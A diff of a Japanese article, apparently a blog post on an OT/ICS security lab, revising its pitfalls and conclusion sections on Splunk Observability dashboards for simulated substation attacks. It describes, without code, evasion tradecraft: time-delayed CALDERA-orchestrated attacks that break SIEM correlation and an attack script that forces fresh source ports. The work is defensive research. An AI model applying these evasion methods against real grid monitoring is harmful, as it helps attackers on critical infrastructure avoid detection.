-3. **Panel 3（Table）** には `hmi-nodered` しか表示されない。変電所A（sub_a_ied）と変電所B（sub_b_dnp3）のサービスが **同じテーブルに登場しない** ため、拠点間の攻撃横断を可視化できない。
-
-4. **Panel 4（Single Value）** は「相関ウィンドウを超えた」と警告するが、**何と何の相関が失敗したのか**は示さない。
-
-これが、**「情報は届いている。しかし相関分析が追いつかない」** という構造的限界の正体です。
 
 ---
 
-## 6. 【落とし穴記録】実装で遭遇したトラブル集
+## 6. 【実装ログ：落とし穴と現実の躓き記録】
 
-> 「うまくいった手順書」だけでなく、**「こうして失敗した」という記録こそが実践の価値**です。
-
-### 落とし穴 1：`data('spans', ...)` は APM トレースを参照できない
-
+### 落とし穴 1：`data('spans', ...)` は APM トレースデータを参照できない
 Splunk Observability Cloud の `data()` 関数は **Metric Time Series (MTS) 専用**です。APMトレーススパンは `data()` では直接参照不可能であり、`histogram()` も無効でした。ダッシュボードにOTイベントを表示するには、**トレースとは別にメトリクスパイプラインを構築する**必要がありました。
 
 ### 落とし穴 2：`.env` のトークン未設定
-
-otel-collector のログに `rpc error: code = Unauthenticated desc = invalid token` が出力されていたにもかかわらず、受信ログ（`Traces: spans: 1`）のみを確認して「届いている」と誤認。**受信成功と転送成功は別**であることを学びました。
+otel-collector のログに `rpc error: code = Unauthenticated desc = invalid token` が出力されていたのを見落とし、転送エラーに気付くのが遅れました。
 
 ### 落とし穴 3：Node-RED Function ノードの `require()` 制限
-
-Zipkinスパン生成のために `require('crypto')` を使用したところ、Function ノードが **サイレントに停止**。Node-RED のサンドボックス環境では、Node.js モジュールの動的ロードが制限されています。`Math.random()` による代替実装で解決しました。
+Zipkinスパン生成のために `require('crypto')` を使用したところ、Function ノードが **サイレントに停止**。Node-RED のサンドボックス環境では動的 `require()` が制限されているため、`Math.random()` による簡易実装に切り替えました。
 
 ### 落とし穴 4：Single Value パネルの小数点表示が消せない
-
-`breaker_status` メトリクス（値: `0` or `1`）を Single Value パネルで表示すると `1.00` と小数点以下が付きます。SignalFlow に `.floor()` を追加しても、Edit chart の「Maximum precision value」を `0` に設定しても、**UIレンダリング層で小数点が付与される仕様**のため解決できませんでした。OTLP 経由の整数値が内部的に `double` 型で処理されている可能性があります。
+`breaker_status` メトリクス（値: `0` or `1`）を Single Value パネルで表示すると `1.00` と小数点以下が付きます。SignalFlow の `.floor()` や Edit chart の「Maximum precision value = 0」設定を行っても解決できませんでした。
+Classic ダッシュボード（SPLベース）であればフォーマット制御で容易に回避できる問題ですが、Observability Cloud (SignalFlow) の Single Value パネル仕様に翻弄される形となりました。単純に「0.00」表示を「0」にしようともがくだけで1日食われるという、O11y SaaS 特有のUI制御の罠に直面したリアルな記録です。
 
 ### 落とし穴 5：コックピットUIとサーバー状態の乖離
-
 外部から `/api/breaker` を叩くとサーバー側の状態は更新されますが、ブラウザのコックピットは**クライアントサイドのみの状態管理**だったため反映されませんでした。ページロード時に `/api/status` を fetch して状態を同期する初期化コードの追加で解決しました。
+
+### 落とし穴 6：UIレンダリングエンジンの罠（Line vs Column）
+当初、L4セッション分断の可視化に Line Chart（折れ線グラフ）を使用していたところ、チャートエンジンが離散的な点と点を自動補間して線で繋いでしまい、あたかも「連続したセッション」であるかのように見えてしまう罠に遭遇しました。セッションの物理的断絶を証明するためには、自動補間を行わない **Column チャート（ブロック表現）への変更が不可欠**でした。
+
+### 落とし穴 7：エフェメラルポートが乱立しない OS レイヤーの罠
+Python の攻撃スクリプトで単に `sock.close()` を呼ぶだけでは、OS のソケット再利用ロジック（TIME_WAIT 状態の挙動）により、短時間の再接続時に同一の送信元ポートが再割り当てされてしまう現象が発生しました。OS に新しいエフェメラルポートを確実に強制割り当てさせるため、**攻撃コード側で毎回 `socket.socket()` インスタンスを完全再生成・明示切断する実装**が必要でした。
 
 ---
 
-## 7. まとめと次回への展望
+## 7. まとめと次回（Phase 3）への展望
 
-### 本章で実証されたこと
+本章では、Phase 1 で構築済みの環境に対し、CALDERA C2 オーケストレーションと非同期・時間差攻撃を用いることで、IT型SIEM/可観測性プラットフォームの相関分析が構造的に破綻することを、エフェメラルポート変化とDNP3バイナリ構造対比（Hexダンプ）、および全6パネルのダッシュボードを用いて証明しました。
 
-| 観点 | 結果 |
-|:---|:---|
-| **データの到達性** | メトリクス・イベントともにSplunkに到達している ✅ |
-| **個別イベントの検知** | 遮断器トリップ、偵察パケット等は個別に検知可能 ✅ |
-| **攻撃チェーンの結合** | **Stage 1 と Stage 3 が同一攻撃であることを自動的に結合する手段がない** ❌ |
-| **拠点間の横断可視化** | **変電所Aと変電所Bを1つの攻撃として関連付けられない** ❌ |
+次回（Phase 3）では、この構造的壁を乗り越えるため、**W3C Trace Context（Trace ID）を物理OT通信へ拡張・付与** し、どれほど時間が離れていても一瞬で一本の「攻撃チェーン（Trace Tree）」として自動統合される **決定論的防御** を構築します。
 
-### 得られた教訓
+:::message
+**💡 補足：OT領域における W3C Trace Context の学術・標準化動向**
 
-可観測性プラットフォームは「データを集める」ことには優れていますが、**「データを攻撃文脈で結び付ける」ことは自動ではできません**。タイムスタンプや送信元IPに頼る従来の相関検索は、攻撃者が意図的に時間差を挿入するだけで容易に破綻します。
+W3C Trace Context や OpenTelemetry の概念を OT/ICS 等の物理レイヤーへ適用する試みは、近年 IEEE や CNCF（OpenTelemetry for IoT/Edge）、さらには Zero Trust OT アーキテクチャの研究領域において非常に活発に議論されています。
 
-### 次回（Phase 3）への展望
+従来型のパッシブ監視（DPI等による単発パケット解析）の限界を突破する『次世代の可観測性（OT Observability）』のコア技術として、IT側のセッション追跡技術をどうやって固定長バイナリのOTプロトコルへ注入・伝搬させるか。次回は、この最前線の課題に Docker ラボ環境から直接アプローチします。
+:::
 
-この死角を打破するため、次回は **W3C Trace Context（Trace ID）を物理OT通信へ拡張・付与** し、どれほど時間が離れていても一瞬で一本の「攻撃チェーン（Trace Tree）」として自動統合される **決定論的防御** を構築します。
-
-```
-[Before: Phase 2-2]
-  Stage 1 (偵察) ──── 2.5秒 ──── Stage 3 (攻撃)
-       ↓                              ↓
-  孤立イベント A                 孤立イベント B
-  （相関不能 = UNLINKED）
-
-[After: Phase 3 (W3C Trace Context)]
-  Stage 1 (偵察) ──── 2.5秒 ──── Stage 3 (攻撃)
-       ↓                              ↓
-  Trace ID: abc123               Trace ID: abc123
-       └──────── 同一チェーン ────────┘
-  （自動統合 = LINKED）
-```
